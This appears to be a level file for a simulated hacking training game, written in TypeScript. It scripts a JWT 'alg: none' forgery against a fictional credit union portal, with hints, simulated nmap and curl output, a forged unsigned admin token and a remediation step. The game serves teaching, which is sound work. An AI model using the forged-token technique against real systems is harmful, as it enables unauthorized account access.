import type { ChainDef } from "../../types";
import { match, cmd } from "../../engine";

const IP = "198.51.100.15";
const MEMBER_TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoibWVtYmVyIn0.s1gn4tur3";
const FORGED_TOKEN = "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.";

export const mediumLevel2: ChainDef = {
  id: "medium-2",
  difficulty: "medium",
  order: 2,
  points: 80,
  title: "None of the Above",
  codename: "OPERATION NONE OF THE ABOVE",
  summary: "The token tells the server which algorithm to use to check it. Nobody told the server not to trust that.",
  briefing: [
    "Blue Anchor Credit Union is a small member-owned institution in coastal North Carolina. Their",
    "member portal issues a signed session token on login and trusts it for everything after that —",
    "standard practice, in theory.",
    "",
    "You've got a real, low-privilege member account. That's the whole foothold. The rest is about",
    "reading what the token actually says about itself, and what the server is willing to believe.",
  ],
  debrief: [
    "root cause: the portal's JWT library resolved the signing algorithm from the token's own header",
    "instead of pinning to a server-side allowlist. Setting alg to 'none' and stripping the signature",
    "was enough to produce a token the server accepted as valid — algorithm confusion (CWE-347).",
    "",
    "BLUE ANCHOR CREDIT UNION: SECURED.",
  ],
  nodes: [
    {
      id: "blueanchor",
      org: "Blue Anchor Credit Union",
      city: "Beaufort",
      state: "NC",
      coords: { x: 78.6, y: 34.4 },
      ip: IP,
      tagline: "Member-owned credit union — online banking portal",
      briefing: [
        "TARGET: Blue Anchor Credit Union member portal",
        `IP: ${IP}`,
        "YOU HAVE: a real member account, low privilege, session-token auth.",
        "",
        "Find out how much the portal actually verifies about that token.",
      ],
      initialPrompt: "op@breachline:~$",
      motd: [
        "session notes.txt:",
        "  \"Member auth was 'reviewed' when they switched vendors last year. Nobody could say what",
        "   library it uses or whether it was configured strictly.\" — dispatch",
      ],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Discover the session API and obtain a member token", tactic: "Discovery", requires: ["recon"] },
        { id: "decode", label: "Decode the token and inspect its algorithm header", tactic: "Discovery", requires: ["identify"] },
        { id: "access", label: "Forge an unsigned 'alg: none' token claiming admin role", tactic: "Defense Evasion", requires: ["decode"] },
        { id: "secure", label: "Pin the server to a fixed signing algorithm and reject 'none'", tactic: "Remediation", requires: ["access"] },
      ],
      hints: [
        "Recon first — `nmap -sV <ip>`. Then hit the web root and see what auth flow it describes.",
        "`curl http://<ip>/api/session` with your member credentials returns a session token — read the response carefully, including any header notes about the JWT library.",
        "A JWT is three base64 chunks separated by dots. `base64 -d` the header chunk of the token you were given and see exactly what it says about its own algorithm.",
        "If the server resolves the algorithm from the token instead of enforcing one server-side, an 'alg: none' token with no signature at all is worth trying against an admin-only route.",
      ],
      debrief: [
        "root cause: simple-jwt-auth trusted the 'alg' field inside the token itself rather than pinning to",
        "HS256 server-side, so a token with alg set to 'none' and an empty signature was accepted as valid.",
        "fix applied: signing algorithm pinned server-side, 'none' explicitly rejected, all sessions revoked.",
      ],
      commands: [
        cmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>         — service/version scan",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT   STATE SERVICE VERSION",
              "443/tcp open  https   nginx 1.24.0 (member portal)",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds",
            ],
          }),
        }),
        cmd({
          id: "curl-root",
          tool: "curl",
          requires: [IP],
          forbids: ["api/"],
          help: "curl https://<ip>      — fetch the web root",
          requiresObjectives: ["recon"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>Blue Anchor Credit Union — Member Portal</title>",
              "note: session auth handled by simple-jwt-auth v1.4 (see /api/session, /api/admin)",
            ],
          }),
        }),
        cmd({
          id: "curl-session",
          tool: "curl",
          requires: ["api/session"],
          help: "curl https://<ip>/api/session      — authenticate with your member account",
          requiresObjectives: ["recon"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["have_token"],
            note: `Blue Anchor member session token: ${MEMBER_TOKEN}`,
            output: [
              "HTTP/1.1 200 OK",
              `Set-Cookie: session=${MEMBER_TOKEN}`,
              "",
              "[+] authenticated as a standard member. session issued as a JWT.",
            ],
          }),
        }),
        {
          id: "decode-header",
          tool: "base64",
          match: (input) => {
            const n = input.trim().toLowerCase();
            return n.includes("base64") && n.includes("-d") && n.includes("eyjhbgcioijiuzi1nij9");
          },
          help: `echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d      — decode the token's header segment`,
          requiresFlags: ["have_token"],
          deniedOutput: ["you need a real token to decode first — authenticate against /api/session."],
          run: () => ({
            completesObjective: "decode",
            tone: "success",
            setsFlags: ["decoded"],
            output: [
              '{"alg":"HS256"}',
              "",
              "[+] the algorithm is read straight from the token's own header — worth testing what else the",
              "    server will accept there.",
            ],
          }),
        },
        cmd({
          id: "forge-access",
          tool: "curl",
          requires: ["api/admin", "eyjhbgcioijub25lin0"],
          help: `curl -H "Authorization: Bearer ${FORGED_TOKEN}" https://<ip>/api/admin`,
          requiresFlags: ["decoded"],
          deniedOutput: ["you need to understand the algorithm header before you can abuse it — decode the token first."],
          run: () => ({
            completesObjective: "access",
            tone: "success",
            setsFlags: ["admin_access"],
            note: `Blue Anchor — alg:none forged admin token accepted: ${FORGED_TOKEN}`,
            output: [
              "HTTP/1.1 200 OK",
              "",
              '{"role":"admin","panel":"member-accounts","balance_export":"enabled"}',
              "",
              "[!] a token with alg:none and an empty signature was accepted as a valid admin session.",
            ],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system         — pin the signing algorithm and reject 'none'",
          requiresObjectives: ["access"],
          deniedOutput: ["prove the forged token actually works before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] pinned session verification to HS256 server-side, 'none' explicitly rejected",
              "[+] revoked all outstanding sessions and rotated the signing secret",
              "[+] documented as algorithm confusion (CWE-347)",
              "",
              "BLUE ANCHOR CREDIT UNION: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
